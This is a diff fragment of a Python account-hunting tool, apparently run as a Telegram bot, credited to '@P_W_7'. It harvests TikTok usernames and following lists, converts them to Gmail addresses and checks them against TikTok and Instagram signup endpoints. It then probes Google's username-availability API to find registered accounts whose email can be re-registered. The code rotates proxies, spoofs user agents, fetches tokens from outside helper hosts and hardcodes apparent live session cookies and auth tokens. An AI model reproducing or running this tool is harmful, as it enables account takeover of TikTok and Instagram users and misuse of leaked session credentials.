-   h={'Cookie':'ttwid='+ttwid+'; tiktok_webapp_theme=light; msToken=2cFfY83w7ZYqeJfgSrtprxuGTSGt6Gc0eDwFbgXg9X2H9QKDvqyP84CCl5rQLohHqsWmMbFe6wbNEP8-opBSk0lOsyjuzONVAKvkGqzDSqpjF06wiD6q7dttLj8SXD1G3Hrp; ttwid='+ttwid+'; passport_csrf_token='+zzzug+'; passport_csrf_token_default='+zzzug+'; uid_tt=586f8c5249e9ca4373252f9eee8e7c83c9d67acce516a2f60263e96bd2d05513; uid_tt_ss=586f8c5249e9ca4373252f9eee8e7c83c9d67acce516a2f60263e96bd2d05513; sid_tt='+sessionid+'; sessionid='+sessionid+'; sessionid_ss='+sessionid+'; sid_ucp_v1=1.0.0-KDM4Mzc5NGVjZjZiMTI2YmMwNDliMWZhYTFiZjRmNDQzYjBhMTFmNDkKIAiCiKiSlOmvu2MQgeeEoQYYswsgDDD3_tqbBjgBQOoHEAMaBm1hbGl2YSIgZDI2MTYzZjY4ZTZjOTVkNDljMDNlYzdmNzJkNzAwN2Q; ssid_ucp_v1=1.0.0-KDM4Mzc5NGVjZjZiMTI2YmMwNDliMWZhYTFiZjRmNDQzYjBhMTFmNDkKIAiCiKiSlOmvu2MQgeeEoQYYswsgDDD3_tqbBjgBQOoHEAMaBm1hbGl2YSIgZDI2MTYzZjY4ZTZjOTVkNDljMDNlYzdmNzJkNzAwN2Q; store-idc=maliva; store-country-code=tr; store-country-code-src=uid; tt-target-idc=useast1a; tt-target-idc-sign=cQMNfSjvvlNBGrwBOVqQa00_v09uRkDCThX0h3WaTo3QkciqJxdiEQWfUogQifipphJ2Ew8lBPW5swp2QVAyQLMcRUZM7pXPh0HyaHO8KrEiK9A3hSGZBZxSEAtjUhUMDQUDKDoC0cR0zeg-w2kkEIzXQLMsCGEMP93BoNLamPReCgAQrzLXVcgIYxWPpL5a-6aGuB43e42MWOqeJ5YSA9r0Un4DqveL_K1-LXhXjSwcnPfR6vF53zPExkDb2QMG0jvHTef2Y-aXwqVhDrmc22wJAL5bMgEqtWhsdetK292OW6-_yY0vNW4FeADvZClor00lmXAXqgknfgEXkqbWe8oDu4o4-WTVM8Y0YMAJeS7RJkEW_2Di7V1o17gI8-dYhyE7Zi_Gm9junoMOnpbye8K-E1Tr6NEmp-ceoY1_ic6BewgUoVNqe3A6sYigbBydUam2obTHgrQgOD0Qss3TjvigPlTsC8DrE9DXhiSqAe-dCSnuEL_2tbfXt433ZkPE; tt_csrf_token=PSOxiSio-0SwWbZDgx1udkrvw10E6D869hY4; tt_chain_token=xzQFbQnJcDXq3OHhlmhPQA==; __tea_cache_tokens_1988={%22_type_%22:%22default%22%2C%22user_unique_id%22:%227215088339640649222%22%2C%22timestamp%22:1679893715575}; passport_fe_beating_status=true; csrf_session_id=3f2907b98fa47d37c429fe3249297a97; msToken='+msToken+'',
-                        'User-Agent':pro}
-   r=requests.get(u,headers=h).json()
-   rzo = r['user_list']
-   for usz in rzo:
-    email=str(usz['user_info']['unique_id'])
-    if '_' in email:
-    	continue
-    else:
-    	global ya,no,nod,yas
-    	email=str(email)+'@gmail.com'
-    	#print(email)
-    	a='Mozilla/5.0 (Linux; Android'
-    	b=random.randrange(1, 9);c=random.randrange(1, 9);d='11; Redmi Note 5A Lite)';e=random.randrange(100, 9999);f='AppleWebKit/537.36 (KHTML, like Gecko)';g=random.randrange(1, 9);h=random.randrange(1, 4);i=random.randrange(1, 4);j=random.randrange(1, 4);k='Chrome/96.0.4664.45 Mobile Safari/537.36'
-    	ua=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-    	url = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra" 
-    	data = f"email={email}&aid=1459&language=ar&account_sdk_source=web&region=IQ"
-    	#proxy = '117.54.142.46:8080'
-    	try:
-    		proo = random.choice(porx)
-    		#print(proo)
-    		proxies = {"http":proo, "https":proo}
-    		rr = requests.post(url,headers={"User-Agent": str(ua)},data=data,proxies=proxies,timeout=4).text#
-    	except:
-    		rr = requests.post(url,headers={"User-Agent": str(ua)},data=data).text
-    	#print(rr)
-    	if '":{"is_registered":1' in rr:
-    		os.system('cls'if os.name=='net'else'clear')
-    		ya+=1
-    		print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
-    		eml=str(email)
-    		email=eml.split('@')[0]+'@gmail.com'
-    		he3 = {
-	    "accept": "*/*",
-	    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
-	    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
-	    "google-accounts-xsrf": "1",
-	    "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
-	    "sec-ch-ua-arch": "\"\"",
-	    "sec-ch-ua-bitness": "\"\"",
-	    "sec-ch-ua-full-version": "\"116.0.5845.72\"",
-	    "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
-	    "sec-ch-ua-mobile": "?1",
-	    "sec-ch-ua-model": "\"ANY-LX2\"",
-	    "sec-ch-ua-platform": "\"Android\"",
-	    "sec-ch-ua-platform-version": "\"13.0.0\"",
-	    "sec-ch-ua-wow64": "?0",
-	    "sec-fetch-dest": "empty",
-	    "sec-fetch-mode": "cors",
-	    "sec-fetch-site": "same-origin",
-	    "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
-	    "x-client-data": "CJjbygE=",
-	    "x-same-domain": "1",
-	    "Referrer-Policy": "strict-origin-when-cross-origin",
-	'user-agent': generate_user_agent()};tokk=requests.get('https://ssh5o-8ce98cab62ff.herokuapp.com/').text;da=(f'continue=https%3A%2F%2Fwww.google.com%2F&dsh=S1644399110%3A1695515527985204&flowEntry=ServiceLogin&hl=ar&ifkv=AYZoVhctgJglce8ngDS-YYmRkMjKcyuUZeIA6MlKZuxdmLk8INHHJp3tpqbQVyTNKjkpytBw8jTBiw&theme=glif&f.req=%5B%22{tokk}%22%2C%22zaid%22%2C%22ar%22%2C%22zaid%22%2C%22ar%22%2C0%2C0%2Cnull%2Cnull%2C%22web-glif-signup%22%2C0%2Cnull%2C1%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2C1%5D&azt=AFoagUWvOuuV65yGblelgMb8YgqIxqf-PQ%3A1695546705215&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C0%2Cnull%2C0%2C2%2C%22%22%2Cnull%2Cnull%2C0%2C0%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A847%3A1&checkedDomains=youtube&pstMsg=1&]');zaid= requests.post('https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=43956&rt=j',headers=he3,data=da).text;tl=zaid.split('["gf.ttu",null,"')[1].split('"],')[0];url = f'https://accounts.google.com/_/signup/usernameavailability?hl=ar&TL={tl}&_reqid=765070&rt=j';headers={
-			'Accept': '*/*',
-			'Accept-Encoding': 'gzip, deflate, br',
-			'Accept-Language': 'en-US,en;q=0.9',
-			'Content-Length': '898',
-			'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
-			'Cookie': cokie,
-			'Google-Accounts-Xsrf': '1',
-			'Origin': 'https://accounts.google.com',
-			'Referer': f'https://accounts.google.com/signup/v2/emailsignup?sjid=12488103466622635336-EU&theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
-			'Sec-Ch-Ua': '"Not;A=Brand";v="8", "Chromium";v="117", "Google Chrome";v="117"',
-			'Sec-Ch-Ua-Arch': '"x86"',
-			'Sec-Ch-Ua-Bitness': '"64"',
-			'Sec-Ch-Ua-Full-Version': '"117.0.5938.63"',
-			'Sec-Ch-Ua-Full-Version-List': '"Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.63", "Google Chrome";v="117.0.5938.63"',
-			'Sec-Ch-Ua-Mobile': '?0',
-			'Sec-Ch-Ua-Model': '""',
-			'Sec-Ch-Ua-Platform': '"Windows"',
-			'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
-			'Sec-Ch-Ua-Wow64': '?0',
-			'Sec-Fetch-Dest': 'empty',
-			'Sec-Fetch-Mode': 'cors',
-			'Sec-Fetch-Site': 'same-origin',
-			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
-			'X-Same-Domain': '1',
-		};data={
-			'theme': 'glif',
-			'continue': 'https://accounts.google.com/ManageAccount?nc=1',
-			'f.req': f'["TL:{tl}","{str(email)}",0,0,0,null,0,3508]',
-			'at': 'AFoagUU9EVwn5NhOjSbSekGRb853taFYlw:1695481442901',
-			'azt': 'AFoagUUmBNb6Od8MKLAz3aR1k7PQTrK84Q:1695481442901',
-			'cookiesDisabled': 'false',
-			'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
-			'gmscoreversion': 'undefined',
-			'flowName': 'GlifWebSignIn',
-			'checkConnection': 'youtube:671:0',
-			'checkedDomains': 'youtube',
-			'pstMsg': '1',
-		}
-	
-    		try:
-    			rr = requests.post(url,headers=headers,data=data).text
-    			#print(rr)
-    		except:
-    			print('')
-    		if '"gf.uar",1,' in rr:
-    			yas+=1
-    			os.system('cls'if os.name=='net'else'clear')
-    			zzod(email)
-    			print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
-    		else:
-    			os.system('cls'if os.name=='net'else'clear')
-    			nod+=1
-    			#print(zom)
-    			print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
-    	elif '":{"is_registered":0' in rr:
-    		os.system('cls'if os.name=='net'else'clear')
-    		no+=1
-    		print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
-    	else:
-    		#print(rr)
-    		os.system('clear')
-
-  except:
-    pass 
-    znoxy()	
-	
-
-def allus():
-	au=[]
+		key = types.InlineKeyboardMarkup()
+		bot.send_message(message.chat.id, f"<strong>هنـاك خـطأ فـي الـملف</strong>",parse_mode="html",reply_markup=key)
 	try:
-		ada = int(input(f'{S}∆ - Write Numper User : '))
-		print('')
-		print(f'{B}═════════════════════════════')
-	except ValueError:
-		print(f'{S} Error Input :) ')
-	if ada<1:
-		print(f'{S} Error Input :) ')
-	for met in range(ada):
-		us = input(f'{S}{met} - Write User Tiktok : ')
-		print('')
-		print(f'{B}═════════════════════════════')
-		au.append(us)
-	for user in au:
-		try:
-			url = 'http://tik.report.ilebo.cc/users/login'
-			he = {
-	'X-IG-Capabilities': '3brTvw==',
-	'User-Agent': 'TikTok 85.0.0.21.100 Android (33/13; 480dpidpi; 1080x2298; HONOR; ANY-LX2; ANY-LX2;)',
-	'Accept-Language': 'en-US',
-	'Content-Type': 'application/json; charset=utf-8',
-	'Content-Length': '73',
-	'Host': 'tik.report.ilebo.cc',
-	'Connection': 'Keep-Alive',
-	'Accept-Encoding': 'gzip',
-	};da={"unique_id":f"{user}","purchaseTokens":[]};re=requests.post(url,headers=he,data=da).json()
-			id = re['data']['user']['user']['id']
-			print(f'>ID Your Account : {E}{id}')
-		except:
-				os.system('clear')
-				print(f'Error User : {user}')
-		uid = "".join(random.choice('1234567890')for i in range(18))
-		url = f'https://api2-19-h2.musical.ly/aweme/v1/user/following/list/?user_id={id}&max_time=0&count=200&offset=0&source_type=2&address_book_access=2&gps_access=2&manifest_version_code=2019081160&_rticket=1694547483074&app_language=ar&current_region=IQ&app_type=normal&iid=7278024586699523845&channel=googleplay&device_type=SM-N960N&language=ar&locale=ar&resolution=720*1280&openudid=19e5434d5417cdcb&update_version_code=2019081160&sys_region=EG&os_api=28&uoo=0&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=320&residence=IQ&carrier_region=IQ&ac=wifi&device_id=7272729095556662789&pass-route=1&mcc_mnc=41820&os_version=9&timezone_offset=10800&version_code=120603&carrier_region_v2=418&app_name=musical_ly&ab_version=12.6.3&version_name=12.6.3&device_brand=samsung&ssmix=a&pass-region=1&device_platform=android&build_number=12.6.3&region=EG&aid=1233&ts=1694547477&sec_user_id={user}';he = {
-            'Host': 'api2-19-h2.musical.ly',
-            'accept-encoding': 'gzip',
-            'sdk-version': '1',
-            'cookie': 'store-idc=maliva; store-country-code=iq; d_ticket=75f95e60c9cde3facb8a2439ba7ae961c041b; passport_csrf_token_default=efd0ea2687a947be434c6524721ac06e; odin_tt=f3be583347fd2518a759031ef11d5d1689c1da8da26dc6f75c5af6e63415f455dff04a813d191640436119eec0f23115be695337bf00b4e942a9f43d770598609a5502760e788ca9aa8ee7f5bc1f4b12; sid_guard=838773198b8ebc47900c997493f06e17%7C1694547407%7C15551999%7CSun%2C+10-Mar-2024+19%3A36%3A46+GMT; uid_tt=87a4e2238bd92924b8b9f26d811871f20f4d886c41b0c2c4df40ce7476408331; sid_tt=838773198b8ebc47900c997493f06e17; sessionid=838773198b8ebc47900c997493f06e17; store-country-code-src=uid',
-            'x-tt-token': '03838773198b8ebc47900c997493f06e1705a79067fed630a2c16bd4f60750606123d398071c0ecee0fd617a0697c63ec832afcf3fe4725d522a3892e6c6d2eeb883f6b3c9e43075815a5e99d16d4dcae6eaebf7d9bd94c0adb0c41319139bc34fb34-CkBiNzEyOGZjZjliMTI1MDZkMTkwMzRlOWY1ZWZiYTdmYzE1ZTNlOTc0YWJhZjIzOWMzN2U4ZGE5MzI4MTBjNzhk-2.0.0',
-            'x-khronos': '1694549064',
-            'x-gorgon': '8300ea164000e65d9b4756041c6b3743225fd6450a2e4dadf734',
-            'user-agent': 'okhttp/3.10.0.1',
+		file = open(f'usernamezaid{iid}.txt','r').read().splitlines()
+		addd = len(open(f"usernamezaid{iid}.txt").read().splitlines())
+	except FileNotFoundError as error:
+		key = types.InlineKeyboardMarkup()
+		bot.send_message(message.chat.id, f"<strong>هنـاك خطـأ او مشـكله مـا </strong>",parse_mode="html",reply_markup=key)
+	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>بـدا الفحص اذهب  الى الاداه </strong>",parse_mode="html",reply_markup=key)
+	os.system('clear')
+	for zood in file:
+			addad+=1
+			zzoy+=1
+			try:
+				email = (zood).split('@')[0]+dom
+			except:
+				email = (zood)+dom
+				eerr+=1				
+			url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
+			head= {	
+		 'Host': 'www.instagram.com',
+		 'origin': 'https://www.instagram.com',
+		 'referer': 'https://www.instagram.com/accounts/signup/email/',	
+		 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
+		 'user-agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',};data = {
+	'email':f'{email}'
 	}
-	
-
-		re = requests.get(url,headers=he).json()
-		zz=0
-		try:
-			while True:
-				zz+=1
-				us=(re['followings'][zz]['unique_id'])
-				email=us
-				check(email)
-		except:
-			pass	
-
-
-def listproxy(porx):
-	au=[]
-	try:
-		ada = int(input(f'{S}∆ - Write Numper User : '))
-		print('')
-		print(f'{B}═════════════════════════════')
-	except ValueError:
-		print(f'{S} Error Input :) ')
-	if ada<1:
-		print(f'{S} Error Input :) ')
-	for met in range(ada):
-		us = input(f'{S}{met} - Write User Tiktok : ')
-		print('')
-		print(f'{B}═════════════════════════════')
-		au.append(us)
-	for user in au:
-		try:
-			url = 'http://tik.report.ilebo.cc/users/login'
-			he = {
-	'X-IG-Capabilities': '3brTvw==',
-	'User-Agent': 'TikTok 85.0.0.21.100 Android (33/13; 480dpidpi; 1080x2298; HONOR; ANY-LX2; ANY-LX2;)',
-	'Accept-Language': 'en-US',
-	'Content-Type': 'application/json; charset=utf-8',
-	'Content-Length': '73',
-	'Host': 'tik.report.ilebo.cc',
-	'Connection': 'Keep-Alive',
-	'Accept-Encoding': 'gzip',
-	};da={"unique_id":f"{user}","purchaseTokens":[]};re=requests.post(url,headers=he,data=da).json()
-			id = re['data']['user']['user']['id']
-			print(f'>ID Your Account : {E}{id}')
-		except:
-				os.system('clear')
-				print(f'Error User : {user}')
-		uid = "".join(random.choice('1234567890')for i in range(18))
-		url = f'https://api2-19-h2.musical.ly/aweme/v1/user/following/list/?user_id={id}&max_time=0&count=200&offset=0&source_type=2&address_book_access=2&gps_access=2&manifest_version_code=2019081160&_rticket=1694547483074&app_language=ar&current_region=IQ&app_type=normal&iid=7278024586699523845&channel=googleplay&device_type=SM-N960N&language=ar&locale=ar&resolution=720*1280&openudid=19e5434d5417cdcb&update_version_code=2019081160&sys_region=EG&os_api=28&uoo=0&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=320&residence=IQ&carrier_region=IQ&ac=wifi&device_id=7272729095556662789&pass-route=1&mcc_mnc=41820&os_version=9&timezone_offset=10800&version_code=120603&carrier_region_v2=418&app_name=musical_ly&ab_version=12.6.3&version_name=12.6.3&device_brand=samsung&ssmix=a&pass-region=1&device_platform=android&build_number=12.6.3&region=EG&aid=1233&ts=1694547477&sec_user_id={user}';he = {
-            'Host': 'api2-19-h2.musical.ly',
-            'accept-encoding': 'gzip',
-            'sdk-version': '1',
-            'cookie': 'store-idc=maliva; store-country-code=iq; d_ticket=75f95e60c9cde3facb8a2439ba7ae961c041b; passport_csrf_token_default=efd0ea2687a947be434c6524721ac06e; odin_tt=f3be583347fd2518a759031ef11d5d1689c1da8da26dc6f75c5af6e63415f455dff04a813d191640436119eec0f23115be695337bf00b4e942a9f43d770598609a5502760e788ca9aa8ee7f5bc1f4b12; sid_guard=838773198b8ebc47900c997493f06e17%7C1694547407%7C15551999%7CSun%2C+10-Mar-2024+19%3A36%3A46+GMT; uid_tt=87a4e2238bd92924b8b9f26d811871f20f4d886c41b0c2c4df40ce7476408331; sid_tt=838773198b8ebc47900c997493f06e17; sessionid=838773198b8ebc47900c997493f06e17; store-country-code-src=uid',
-            'x-tt-token': '03838773198b8ebc47900c997493f06e1705a79067fed630a2c16bd4f60750606123d398071c0ecee0fd617a0697c63ec832afcf3fe4725d522a3892e6c6d2eeb883f6b3c9e43075815a5e99d16d4dcae6eaebf7d9bd94c0adb0c41319139bc34fb34-CkBiNzEyOGZjZjliMTI1MDZkMTkwMzRlOWY1ZWZiYTdmYzE1ZTNlOTc0YWJhZjIzOWMzN2U4ZGE5MzI4MTBjNzhk-2.0.0',
-            'x-khronos': '1694549064',
-            'x-gorgon': '8300ea164000e65d9b4756041c6b3743225fd6450a2e4dadf734',
-            'user-agent': 'okhttp/3.10.0.1',
-	}
-	
-
-		re = requests.get(url,headers=he).json()
-		zz=0
-		try:
-			while True:
-				zz+=1
-				us=(re['followings'][zz]['unique_id'])
-				email=us
-				global ya,no,nod,yas
-				email=str(email)+'@gmail.com'
-				#print(email)
-				a='Mozilla/5.0 (Linux; Android'
-				b=random.randrange(1, 9);c=random.randrange(1, 9);d='11; Redmi Note 5A Lite)';e=random.randrange(100, 9999);f='AppleWebKit/537.36 (KHTML, like Gecko)';g=random.randrange(1, 9);h=random.randrange(1, 4);i=random.randrange(1, 4);j=random.randrange(1, 4);k='Chrome/96.0.4664.45 Mobile Safari/537.36'
-				ua=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-				url = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra"
-				data = f"email={email}&aid=1459&language=ar&account_sdk_source=web&region=IQ"
+			try:
+				r= requests.post(url,headers=head,data=data).text
+			except:
+				continue
+			if 'email_is_taken' in r:	
+				y1+=1
+				os.system('cls'if os.name=='net'else'clear')
+				print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')	
 				try:
-						proo = random.choice(porx)
-						#print(proo)
-						proxies = {"http":proo, "https":proo}
-						rr = requests.post(url,headers={"User-Agent": str(ua)},data=data,proxies=proxies,timeout=4).text#
+					rr = requests.post(f'https://hotmaill-f9e6a52eee88.herokuapp.com/zaid/?email={email}').text
 				except:
-					rr = requests.post(url,headers={"User-Agent": str(ua)},data=data).text
-				#print(rr)
-				if '":{"is_registered":1' in rr:
-						os.system('cls'if os.name=='net'else'clear')
-						ya+=1
-						print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
-						eml=str(email)
-						email=eml.split('@')[0]+'@gmail.com'
-						he3 = {
-	    "accept": "*/*",
-	    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
-	    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
-	    "google-accounts-xsrf": "1",
-	    "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
-	    "sec-ch-ua-arch": "\"\"",
-	    "sec-ch-ua-bitness": "\"\"",
-	    "sec-ch-ua-full-version": "\"116.0.5845.72\"",
-	    "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
-	    "sec-ch-ua-mobile": "?1",
-	    "sec-ch-ua-model": "\"ANY-LX2\"",
-	    "sec-ch-ua-platform": "\"Android\"",
-	    "sec-ch-ua-platform-version": "\"13.0.0\"",
-	    "sec-ch-ua-wow64": "?0",
-	    "sec-fetch-dest": "empty",
-	    "sec-fetch-mode": "cors",
-	    "sec-fetch-site": "same-origin",
-	    "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
-	    "x-client-data": "CJjbygE=",
-	    "x-same-domain": "1",
-	    "Referrer-Policy": "strict-origin-when-cross-origin",
-	'user-agent': generate_user_agent()};tokk=requests.get('https://pepperygeneralactionscript.zodhok.repl.co/').text;da=(f'continue=https%3A%2F%2Fwww.google.com%2F&dsh=S1644399110%3A1695515527985204&flowEntry=ServiceLogin&hl=ar&ifkv=AYZoVhctgJglce8ngDS-YYmRkMjKcyuUZeIA6MlKZuxdmLk8INHHJp3tpqbQVyTNKjkpytBw8jTBiw&theme=glif&f.req=%5B%22{tokk}%22%2C%22zaid%22%2C%22ar%22%2C%22zaid%22%2C%22ar%22%2C0%2C0%2Cnull%2Cnull%2C%22web-glif-signup%22%2C0%2Cnull%2C1%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2C1%5D&azt=AFoagUWvOuuV65yGblelgMb8YgqIxqf-PQ%3A1695546705215&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C0%2Cnull%2C0%2C2%2C%22%22%2Cnull%2Cnull%2C0%2C0%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A847%3A1&checkedDomains=youtube&pstMsg=1&]');zaid= requests.post('https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=43956&rt=j',headers=he3,data=da).text;tl=zaid.split('["gf.ttu",null,"')[1].split('"],')[0];url = f'https://accounts.google.com/_/signup/usernameavailability?hl=ar&TL={tl}&_reqid=765070&rt=j';headers={
-			'Accept': '*/*',
-			'Accept-Encoding': 'gzip, deflate, br',
-			'Accept-Language': 'en-US,en;q=0.9',
-			'Content-Length': '898',
-			'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
-			'Cookie': cokie,
-			'Google-Accounts-Xsrf': '1',
-			'Origin': 'https://accounts.google.com',
-			'Referer': f'https://accounts.google.com/signup/v2/emailsignup?sjid=12488103466622635336-EU&theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
-			'Sec-Ch-Ua': '"Not;A=Brand";v="8", "Chromium";v="117", "Google Chrome";v="117"',
-			'Sec-Ch-Ua-Arch': '"x86"',
-			'Sec-Ch-Ua-Bitness': '"64"',
-			'Sec-Ch-Ua-Full-Version': '"117.0.5938.63"',
-			'Sec-Ch-Ua-Full-Version-List': '"Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.63", "Google Chrome";v="117.0.5938.63"',
-			'Sec-Ch-Ua-Mobile': '?0',
-			'Sec-Ch-Ua-Model': '""',
-			'Sec-Ch-Ua-Platform': '"Windows"',
-			'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
-			'Sec-Ch-Ua-Wow64': '?0',
-			'Sec-Fetch-Dest': 'empty',
-			'Sec-Fetch-Mode': 'cors',
-			'Sec-Fetch-Site': 'same-origin',
-			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
-			'X-Same-Domain': '1',
-		};data={
-			'theme': 'glif',
-			'continue': 'https://accounts.google.com/ManageAccount?nc=1',
-			'f.req': f'["TL:{tl}","{str(email)}",0,0,0,null,0,3508]',
-			'at': 'AFoagUU9EVwn5NhOjSbSekGRb853taFYlw:1695481442901',
-			'azt': 'AFoagUUmBNb6Od8MKLAz3aR1k7PQTrK84Q:1695481442901',
-			'cookiesDisabled': 'false',
-			'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
-			'gmscoreversion': 'undefined',
-			'flowName': 'GlifWebSignIn',
